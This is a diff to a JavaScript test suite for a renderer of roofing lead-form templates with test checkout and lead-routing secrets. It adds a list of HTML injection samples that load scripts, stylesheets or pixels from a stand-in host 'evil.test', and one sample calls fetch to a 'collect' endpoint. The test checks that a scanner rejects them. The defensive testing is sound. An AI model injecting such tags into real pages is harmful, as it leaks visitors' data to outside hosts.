@@ -18,19 +18,26 @@ const runArc1 = new AsyncFunction("inputData", arc1Source);
 const fixture = fixtures[0];
 const paymentLinkUrl = "https://buy.stripe.com/test_00000000000000";
 const checkoutBindingSecret = "arc-test-checkout-binding-secret-32-bytes-minimum";
+const leadRouteEvidenceSecret = "arc-test-lead-route-evidence-secret-32-bytes-minimum";
 const intakeContext = createTestIntakeEvidence();
 const paymentLinkContext = createTestPaymentLinkEvidence({ paymentLinkUrl });
 const rendererOptions = {
   trustedEventPrefix: fixture.id,
   customerEmail: fixture.customerEmail,
   paymentLinkUrl,
-  checkoutBindingSecret
+  checkoutBindingSecret,
+  leadNotificationEmail: fixture.customerEmail,
+  leadRouteEvidenceSecret
 };
 const arc1Input = content => ({
   template_content: template,
   raw_json: JSON.stringify(content),
   customer_email: fixture.customerEmail,
+  private_claim_recipient_email: fixture.customerEmail,
   checkout_binding_secret: checkoutBindingSecret,
+  checkout_binding_key_id: "01",
+  private_lead_notification_email: fixture.customerEmail,
+  lead_route_evidence_secret: leadRouteEvidenceSecret,
   ...paymentLinkContext.privateInputs,
   ...intakeContext.privateInputs
 });
@@ -154,6 +161,23 @@ const ordinary = renderPreview(template, fixture.content, rendererOptions);
 assert.match(ordinary.html, /<form name="roofing-lead" method="POST" data-netlify="true"/);
 assert.match(ordinary.html, /<article><h3>Roof Replacement<\/h3>/);
 assert.doesNotMatch(template, /"(?:name|description|areaServed)"\s*:\s*"\[\[/);
+
+const finalByteEgressAttacks = [
+  '<script src="https://evil.test/runtime.js"></script>',
+  '<link rel="stylesheet" href="https://evil.test/runtime.css">',
+  '<style>.leak{background:url(https://evil.test/pixel.png)}</style>',
+  '<script>fetch("https://evil.test/collect")</script>',
+  '<script>const node=document.createElement("img");node.src="https://evil.test/pixel.png"</script>',
+  '<img src="https://evil.test/unsigned.png" alt="Unsigned">'
+];
+for (const attack of finalByteEgressAttacks) {
+  const attackedTemplate = template.replace("</head>", `${attack}\n</head>`);
+  await assert.rejects(
+    runArc1({ ...arc1Input(fixture.content), template_content: attackedTemplate }),
+    /ARC_REMOTE_DEPENDENCY_INVALID/,
+    `Zapier final-byte scanner accepted ${attack}`
+  );
+}
 
 const validatorFormAttacks = [
   fixture.content.CONTACT_ACTION_HTML.replace('value="roofing-lead"', 'value="wrong-lead"'),
